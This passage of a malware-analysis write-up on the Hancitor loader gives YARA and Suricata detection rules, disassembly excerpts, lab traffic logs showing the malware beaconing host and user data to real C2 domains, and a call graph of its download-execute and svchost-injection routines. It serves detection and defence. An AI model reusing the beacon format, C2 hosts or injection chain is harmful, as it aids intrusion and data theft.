  meta:
    description = "Hancitor (packed)"
    author = "Andras Gemes"
    date = "2025-02-18"
    sha256 = "efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8"
    ref1 = "https://shadowshell.io/hancitor-loader"
    ref2 = "https://bazaar.abuse.ch/sample/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8"

  strings:
    /*
                            **************************************************************
                            * Export Name Pointers                                       *
                            **************************************************************
                            DAT_1005d3d0                                    XREF[1]:     1005d3c0(*)  
      1005d3d0 e6 d3 05 00     ibo32      1005d3e6                                         = "Broke"
      1005d3d4 ec d3 05 00     ibo32      1005d3ec                                         = "Necessaryearly"
    */
    $1 = "Broke"
    $2 = "Necessaryearly"

    /*
      1005ac6b 68 88 0e        PUSH       0xe88
               00 00
      1005ac70 68 10 75        PUSH       DAT_10007510                                     = E1h
               00 10
      1005ac75 68 18 09        PUSH       DAT_10060918
               06 10
      1005ac7a e8 f1 ca        CALL       _memcpy                                          void * _memcpy(void * _Dst, void
               fb ff
    */
    $_memcpy = { 68 88 0e 00 00 68 [4] 68 [4] e8 }

    /*
      1005b526 68 83 05        PUSH       0x583
               00 00
      1005b52b 8d 54 24 34     LEA        EDX=>local_b10,[ESP + 0x34]
      1005b52f 52              PUSH       EDX
      1005b530 ff 15 18        CALL       dword ptr [->KERNEL32.DLL::GetSystemDirectoryW]  = 0005c73a
               10 00 10
    */
    $GetSystemDirectoryW = { 68 83 05 00 00 8d 54 24 34 52 ff 15 }

    /*
      1005a3ad 68 83 05        PUSH       0x583
               00 00
      1005a3b2 68 20 fc        PUSH       DAT_1005fc20
               05 10
      1005a3b7 6a 00           PUSH       0x0
      1005a3b9 ff 15 28        CALL       dword ptr [->KERNEL32.DLL::GetModuleFileNameW]   = 0005c778
               10 00 10
    */
    $GetModuleFileNameW = { 68 83 05 00 00 68 [4] 6a 00 ff 15 }

    /*
      1005a401 a1 20 20        MOV        EAX,[DAT_10072020]
               07 10
      1005a406 8b 15 94        MOV        EDX,dword ptr [DAT_1005f094]                     = 000A9AD5h
               f0 05 10
      1005a40c 68 14 09        PUSH       DAT_10060914
               06 10
      1005a411 6a 40           PUSH       0x40
      1005a413 68 00 51        PUSH       0x5100
               00 00
      1005a418 50              PUSH       EAX
      1005a419 6a ff           PUSH       -0x1
      1005a41b 8d 9c 16        LEA        EBX,[ESI + EDX*0x1 + 0x10f]
               0f 01 00 00
      1005a422 ff 15 38        CALL       dword ptr [->KERNEL32.DLL::VirtualProtectEx]     = 0005c7c6
               10 00 10
    */
    $VirtualProtectEx = { a1 [4] 8b 15 [4] 68 [4] 6a 40 68 00 51 00 00 50 6a ff 8d 9c 16 0f 01 00 00 ff 15 }

    /*
      1005a4f9 2a c2           SUB        AL,DL
      1005a4fb 68 20 fc        PUSH       DAT_1005fc20
               05 10
      1005a500 02 c3           ADD        AL,BL
      1005a502 68 83 05        PUSH       0x583
               00 00
      1005a507 a2 68 f0        MOV        [DAT_1005f068],AL                                = C8h
               05 10
      1005a50c ff 15 30        CALL       dword ptr [->KERNEL32.DLL::GetCurrentDirectoryW] = 0005c79c
               10 00 10
    */
    $GetCurrentDirectoryW = { 2a c2 68 [4] 02 c3 68 83 05 00 00 a2 [4] ff 15 }

    /*
      10028e6f 8a da           MOV        BL,DL
      10028e71 2a d8           SUB        BL,AL
      10028e73 02 d9           ADD        BL,CL
      10028e75 80 c3 19        ADD        BL,0x19
      10028e78 0f b6 cb        MOVZX      ECX,BL
      10028e7b 2b ca           SUB        ECX,EDX
      10028e7d 0f b7 d6        MOVZX      EDX,SI
      10028e80 03 d1           ADD        EDX,ECX
      10028e82 89 15 64        MOV        dword ptr [DAT_1005f064],EDX                     = 000BE899h
               f0 05 10
    */
    $decrypt1 = { 8a da 2a d8 02 d9 80 c3 19 0f b6 cb 2b ca 0f b7 d6 03 d1 89 15 }

    /*
      10028e88 8b 1d b8        MOV        EBX,dword ptr [DAT_1005f0b8]                     = 00000051h
               f0 05 10
      10028e8e 81 c7 d0        ADD        EDI,0x10864d0
               64 08 01
      10028e94 8a cb           MOV        CL,BL
      10028e96 2a c8           SUB        CL,AL
      10028e98 89 7d 00        MOV        dword ptr [EBP],EDI
      10028e9b 80 c1 17        ADD        CL,0x17
      10028e9e 83 c5 04        ADD        EBP,0x4
      10028ea1 83 6c 24        SUB        dword ptr [ESP + local_c],0x1
               10 01
      10028ea6 89 3d 24        MOV        dword ptr [DAT_10072024],EDI
               20 07 10
    */
    $decrypt2 = { 8b 1d [4] 81 c7 d0 64 08 01 8a cb 2a c8 89 7d 00 80 c1 17 83 c5 04 83 6c 24 10 01 89 3d }

  condition:
    pe.is_pe and 5 of them
}
```

#### Unpacked binary

The unpacked DLL has much more distinctive characteristics (e.g. specific strings, and the SHA1 and RC4 based config extractor) which enables constructing a good YARA rule.


```
import "pe"

rule hancitor_unpacked {
  meta:
    description = "Hancitor (unpacked)"
    author = "Andras Gemes"
    date = "2025-02-18"
    sha256 = "3b0e94042c0387a80f2f59ae38e8bdf1cd026a328c1b641b777403ae575ba0f0"
    ref1 = "https://shadowshell.io/hancitor-loader"
    ref2 = "https://bazaar.abuse.ch/sample/efbdd00df327459c9db2ffc79b2408f7f3c60e8ba5f8c5ffd0debaff986863a8"

  strings:
    $1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
    $2 = "http://api.ipify.org"
    $3 = "0.0.0.0"
    /*
      undefined4 __cdecl mw_check_cmd(char *param_1)

      {
        char *local_8;
        
        local_8 = s_ncdrleb_100041f0;
        if (param_1[1] == ':') {
          for (; *local_8 != '\0'; local_8 = local_8 + 1) {
            if (*local_8 == *param_1) {
              return 1;
            }
          }
        }
        return 0;
      }
    */
    $4 = "ncdrleb"
    $5 = "GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x64)"
    $6 = "GUID=%I64u&BUILD=%s&INFO=%s&EXT=%s&IP=%s&TYPE=1&WIN=%d.%d(x32)"
    $7 = "Rundll32.exe %s, start"
    $8 = "svchost.exe"
    $9 = "explorer.exe"
    $10 = "SystemRoot"
    $11 = "\\System32\\svchost.exe"
    $12 = "MASSLoader.dll"
    /*
                            **************************************************************
                            * Export Name Pointers                                       *
                            **************************************************************
                            DAT_100043e0                                    XREF[1]:     100043d0(*)  
      100043e0 fb 43 00 00     ibo32      100043fb                                         = "FCQNEAXPXCR"
      100043e4 07 44 00 00     ibo32      10004407                                         = "GSDEAEBPVHTSM"
    */
    $13 = "FCQNEAXPXCR"
    $14 = "GSDEAEBPVHTSM"

    /*
      10002d1c 8d 4d fc        LEA        ECX=>local_8,[EBP + -0x4]
      10002d1f 51              PUSH       ECX
      10002d20 6a 00           PUSH       0x0
      10002d22 6a 00           PUSH       0x0
      10002d24 68 04 80        PUSH       CALG_SHA1 // 0x8004
               00 00
      10002d29 8b 55 f8        MOV        EDX,dword ptr [EBP + local_c]
      10002d2c 52              PUSH       EDX
      10002d2d ff 15 0c        CALL       dword ptr [->ADVAPI32.DLL::CryptCreateHash]      = 00004bde
               40 00 10
    */
    $CryptCreateHash = { 8d 4d fc 51 6a 00 6a 00 68 04 80 00 00 8b 55 f8 52 ff 15 }

    /*
      10002d57 8d 45 f4        LEA        EAX=>local_10,[EBP + -0xc]
      10002d5a 50              PUSH       EAX
      10002d5b 8b 4d ec        MOV        ECX,dword ptr [EBP + local_18]
      10002d5e 51              PUSH       ECX
      10002d5f 8b 55 fc        MOV        EDX,dword ptr [EBP + local_8]
      10002d62 52              PUSH       EDX
      10002d63 68 01 68        PUSH       CALG_RC4 // 0x6801
               00 00
      10002d68 8b 45 f8        MOV        EAX,dword ptr [EBP + local_c]
      10002d6b 50              PUSH       EAX
      10002d6c ff 15 18        CALL       dword ptr [->ADVAPI32.DLL::CryptDeriveKey]       = 00004baa
               40 00 10

    */
    $CryptDeriveKey = { 8d 45 f4 50 8b 4d ec 51 8b 55 fc 52 68 01 68 00 00 8b 45 f8 50 ff 15 }

  condition:
    pe.is_pe and 8 of them
}
```
### Suricata

Note: the rules are available [here](https://github.com/gemesa/threat-detection-rules) as well.

Since the malware is actively trying to reach the C2 servers, IDS/IPS rules can be created to detect and block it.

```
$ cat hancitor.rules
alert http any any -> any any (msg:"Hancitor beacon"; flow:established,to_server; http.request_body; content:"GUID="; content:"&BUILD="; content:"&INFO="; content:"&EXT="; content:"&IP="; content:"&TYPE=1"; content:"&WIN="; sid:1000001; rev:2;)
$ sudo suricata -c /etc/suricata/suricata.yaml -s hancitor.rules -i enp0s3
$ sudo tail -f /var/log/suricata/fast.log
02/24/2025-15:31:54.255497  [**] [1:1000001:2] Hancitor beacon [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.56.129:49929 -> 192.168.56.128:80
02/24/2025-15:31:54.275576  [**] [1:1000001:2] Hancitor beacon [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.56.129:49930 -> 192.168.56.128:80
02/24/2025-15:31:54.299836  [**] [1:1000001:2] Hancitor beacon [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.56.129:49931 -> 192.168.56.128:80
```

### Zeek

If a PCAP storage system is also in place, after an alert is generated by the IDS/IPS, the event can be easily investigated with analysis tools like `zeek` and `zeek-cut`.

```
$ tshark -i enp0s3 -w dump.pcapng
$ zeek -r dump.pcapng
$ zeek-cut -d ts uid host uri < http.log
2025-02-24T15:31:54-0500	CuRutT0sI7Y5RBzIk	declassivan.ru	/8/forum.php
2025-02-24T15:31:54-0500	CHa5Vt2p9waXvlWhyh	idgentexpliet.ru	/8/forum.php
2025-02-24T15:31:54-0500	CPFdVId79T6AX9m31	api.ipify.org	/
2025-02-24T15:31:53-0500	CQVP9D3ivOMOgkWNCf	ctldl.windowsupdate.com	/msdownload/update/v3/static/trustedr/en/authrootstl.cab?f1331f57fc831c0d
2025-02-24T15:31:54-0500	CmExvp20ugiy1cdD4a	intakinger.com	/8/forum.php
$ tshark -r dump.pcapng -Y "http.host contains declassivan.ru" -T fields -e http.file_data
GUID=11575264094754111496&BUILD=2508_bqplf&INFO=DESKTOP-O8AU853 @ DESKTOP-O8AU853\gemesa&EXT=&IP=<html>\n  <head>\n    <title>INetS&TYPE=1&WIN=10.0(x64)
```

## Appendix

### Full call graph

A call graph (full depth with addresses) has been generated with a Ghidra script available [here](https://github.com/gemesa/ghidra-scripts/) for your reference if you want to follow along in Ghidra.

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
FCQNEAXPXCR @ 100019e0
  mw_main @ 10001870
    mw_heap_alloc_w @ 10001390
      GetProcessHeap @ EXTERNAL:00000114
      HeapAlloc @ EXTERNAL:0000005b
    mw_collect_and_send_info @ 10001aa0
      __alloca_probe @ 10001420
      GetVersion @ EXTERNAL:00000117
      mw_get_id_from_mac_and_vsn_w @ 10002630
        mw_get_id_from_mac_and_vsn @ 10001c70
          mw_heap_alloc_w @ 10001390 [already visited!]
          GetAdaptersAddresses @ EXTERNAL:00000058
          mw_memset @ 100014a0
          mw_memcpy @ 10001450
          mw_heap_free_w @ 100013d0
            HeapFree @ EXTERNAL:00000115
          mw_get_volume_serial_number @ 10002490
            GetWindowsDirectoryA @ EXTERNAL:00000119
            GetVolumeInformationA @ EXTERNAL:0000011a
          __allshl @ 10001400
      mw_get_computer_and_username @ 100030f0
        GetComputerNameA @ EXTERNAL:0000005a
        lstrcatA @ EXTERNAL:0000005d
        mw_get_username @ 10002df0
          mw_get_pid_by_name @ 10002e90
            __alloca_probe @ 10001420 [already visited!]
            K32EnumProcesses @ 10003bdd
              K32EnumProcesses @ EXTERNAL:000000bc
            mw_get_process_file_name @ 10002f30
              OpenProcess @ EXTERNAL:00000129
              K32GetProcessImageFileNameA @ 10003be3
                K32GetProcessImageFileNameA @ EXTERNAL:000000be
              CloseHandle @ EXTERNAL:0000011e
              lstrcpyA @ EXTERNAL:0000005c
            lstrcmpiA @ EXTERNAL:00000061
          mw_get_process_username @ 10003000
            OpenProcess @ EXTERNAL:00000129
            OpenProcessToken @ EXTERNAL:0000012a
            GetTokenInformation @ EXTERNAL:0000012b
            GetLastError @ EXTERNAL:0000012c
            mw_heap_alloc_w @ 10001390 [already visited!]
            LookupAccountSidA @ EXTERNAL:00000063
            mw_heap_free_w @ 100013d0 [already visited!]
          lstrcpyA @ EXTERNAL:0000005c
          lstrcatA @ EXTERNAL:0000005d
      mw_get_public_ip_w @ 10002520
        lstrcpyA @ EXTERNAL:0000005c
        mw_handle_http_request @ 10001fe0
          mw_memset @ 100014a0 [already visited!]
          InternetCrackUrlA @ EXTERNAL:00000052
          mw_open_connection @ 100024f0
            InternetOpenA @ EXTERNAL:0000004e
          InternetConnectA @ EXTERNAL:00000057
          HttpOpenRequestA @ EXTERNAL:00000053
          InternetCloseHandle @ EXTERNAL:00000050
          InternetQueryOptionA @ EXTERNAL:00000055
          InternetSetOptionA @ EXTERNAL:00000054
          HttpSendRequestA @ EXTERNAL:0000004f
          HttpQueryInfoA @ EXTERNAL:00000051
          InternetReadFile @ EXTERNAL:00000056
      mw_get_domains @ 100023c0
        DsEnumerateDomainTrustsA @ EXTERNAL:00000118
        lstrcatA @ EXTERNAL:0000005d
      mw_get_system_info_w @ 10003400
        mw_memset @ 100014a0 [already visited!]
        GetModuleHandleA @ EXTERNAL:00000132
        GetProcAddress @ EXTERNAL:00000060
        GetSystemInfo @ EXTERNAL:00000133
      mw_decrypt_config_w @ 100025b0
        mw_heap_alloc_w @ 10001390 [already visited!]
        mw_memcpy @ 10001450 [already visited!]
        mw_decrypt_config @ 10002cd0
          CryptAcquireContextA @ EXTERNAL:00000121
          CryptCreateHash @ EXTERNAL:00000122
          CryptHashData @ EXTERNAL:00000123
          CryptDeriveKey @ EXTERNAL:00000124
          CryptDecrypt @ EXTERNAL:00000125
          CryptDestroyHash @ EXTERNAL:00000126
          CryptDestroyKey @ EXTERNAL:00000127
          CryptReleaseContext @ EXTERNAL:00000128
      wsprintfA @ EXTERNAL:00000062
      mw_heap_alloc_w @ 10001390 [already visited!]
      mw_parse_c2_urls @ 10002660
        mw_decrypt_config_w @ 100025b0 [already visited!]
      mw_handle_http_request_with_header @ 100028d0
        mw_memset @ 100014a0 [already visited!]
        lstrlenA @ EXTERNAL:0000011b
        InternetCrackUrlA @ EXTERNAL:00000052
        mw_open_connection @ 100024f0 [already visited!]
        InternetConnectA @ EXTERNAL:00000057
        HttpOpenRequestA @ EXTERNAL:00000053
        InternetCloseHandle @ EXTERNAL:00000050
        InternetQueryOptionA @ EXTERNAL:00000055
        InternetSetOptionA @ EXTERNAL:00000054
        HttpSendRequestA @ EXTERNAL:0000004f
        HttpQueryInfoA @ EXTERNAL:00000051
        InternetReadFile @ EXTERNAL:00000056
      mw_check_pattern @ 10001a00
        mw_is_uppercase @ 100028b0
    mw_base64_decode_and_xor @ 10001560
      mw_base64_decode @ 10001000
        mw_memset @ 100014a0 [already visited!]
        mw_check_base64_char @ 10001320
    mw_extract_cmd @ 100017b0
    mw_check_cmd @ 100027b0
    mw_execute_cmd @ 10001630
      mw_drop_and_execute_w @ 10001ef0
        mw_heap_alloc_w @ 10001390 [already visited!]
        mw_download_pe_file @ 10002230
          mw_check_pipe_delimiter @ 10002880
          mw_handle_http_request @ 10001fe0 [already visited!]
          mw_check_custom_signature @ 10002810
          mw_decrypt_and_decompress @ 10001d40
            mw_heap_alloc_w @ 10001390 [already visited!]
            RtlDecompressBuffer @ EXTERNAL:00000059
            mw_memcpy @ 10001450 [already visited!]
            mw_heap_free_w @ 100013d0 [already visited!]
          mw_check_mz_header @ 10002b40
          mw_extract_next_url @ 10002720
        mw_drop_and_execute @ 10003b30
          GetTempPathA @ EXTERNAL:0000013a
          GetTempFileNameA @ EXTERNAL:0000013b
          mw_write_to_file @ 10003ac0
            CreateFileA @ EXTERNAL:00000138
            WriteFile @ EXTERNAL:00000139
            CloseHandle @ EXTERNAL:0000011e
          mw_check_if_dll @ 100033c0
          wsprintfA @ EXTERNAL:00000062
          mw_create_process_w @ 100036c0
            mw_memset @ 100014a0 [already visited!]
            CreateProcessA @ EXTERNAL:00000120
            CloseHandle @ EXTERNAL:0000011e
        mw_heap_free_w @ 100013d0 [already visited!]
      mw_execute_shellcode_w @ 10001f60
        mw_heap_alloc_w @ 10001390 [already visited!]
        mw_download_pe_file @ 10002230 [already visited!]
        mw_execute_shellcode @ 10003880
          mw_launch_svchost @ 10002c40
            mw_memset @ 100014a0 [already visited!]
            GetEnvironmentVariableA @ EXTERNAL:0000011f
            lstrcatA @ EXTERNAL:0000005d
            CreateProcessA @ EXTERNAL:00000120
          VirtualAllocEx @ EXTERNAL:0000012f
          WriteProcessMemory @ EXTERNAL:00000130
          CreateRemoteThread @ EXTERNAL:0000005f
          CloseHandle @ EXTERNAL:0000011e
          VirtualAlloc @ EXTERNAL:0000012d
          mw_memcpy @ 10001450 [already visited!]
          mw_thread_start_shellcode @ 100039e0
          CreateThread @ EXTERNAL:0000005e
        mw_heap_free_w @ 100013d0 [already visited!]
      mw_execute_pe_w @ 10001e00
        mw_heap_alloc_w @ 10001390 [already visited!]
        mw_download_pe_file @ 10002230 [already visited!]
        mw_execute_pe @ 10003730
          mw_check_mz_header @ 10002b40 [already visited!]
          mw_map_pe_w @ 10003180
            VirtualAlloc @ EXTERNAL:0000012d
            mw_map_pe @ 10003a00
              mw_memcpy @ 10001450 [already visited!]
              mw_process_relocs @ 10003470
            VirtualFree @ EXTERNAL:0000012e
          mw_resolve_imports @ 10003580
            GetModuleHandleA @ EXTERNAL:00000132
            LoadLibraryA @ EXTERNAL:00000134
            GetProcAddress @ EXTERNAL:00000060
          mw_thread_start @ 100039a0
          CreateThread @ EXTERNAL:0000005e
          CloseHandle @ EXTERNAL:0000011e
        mw_heap_free_w @ 100013d0 [already visited!]
      mw_launch_and_inject_svchost_w @ 10001e80
        mw_heap_alloc_w @ 10001390 [already visited!]
        mw_download_pe_file @ 10002230 [already visited!]
        mw_launch_and_inject_svchost @ 10002b80
          mw_check_mz_header @ 10002b40 [already visited!]
          mw_launch_svchost @ 10002c40 [already visited!]
          mw_inject @ 10003270
            VirtualAllocEx @ EXTERNAL:0000012f
            mw_heap_alloc_w @ 10001390 [already visited!]
            mw_map_pe @ 10003a00 [already visited!]
            WriteProcessMemory @ EXTERNAL:00000130
            mw_heap_free_w @ 100013d0 [already visited!]
            VirtualFreeEx @ EXTERNAL:00000131
          mw_inject_and_resume @ 100037e0
            mw_memset @ 100014a0 [already visited!]
            GetThreadContext @ EXTERNAL:00000135
            WriteProcessMemory @ EXTERNAL:00000130
            SetThreadContext @ EXTERNAL:00000136
            ResumeThread @ EXTERNAL:00000137
          GetProcessId @ EXTERNAL:0000011c
          TerminateProcess @ EXTERNAL:0000011d
          CloseHandle @ EXTERNAL:0000011e
        mw_heap_free_w @ 100013d0 [already visited!]
    mw_store_failed_cmd @ 100014e0
      mw_heap_alloc_w @ 10001390 [already visited!]
      lstrcpyA @ EXTERNAL:0000005c
    Sleep @ EXTERNAL:00000116
    mw_retry_failed_cmd @ 100015c0
      mw_process_pending_cmd @ 10001740
        mw_heap_free_w @ 100013d0 [already visited!]
      mw_execute_cmd @ 10001630 [already visited!]
      mw_remove_executed_cmd @ 10001980
        mw_heap_free_w @ 100013d0 [already visited!]

OrderedCallGraphGenerator.java> Finished!
```
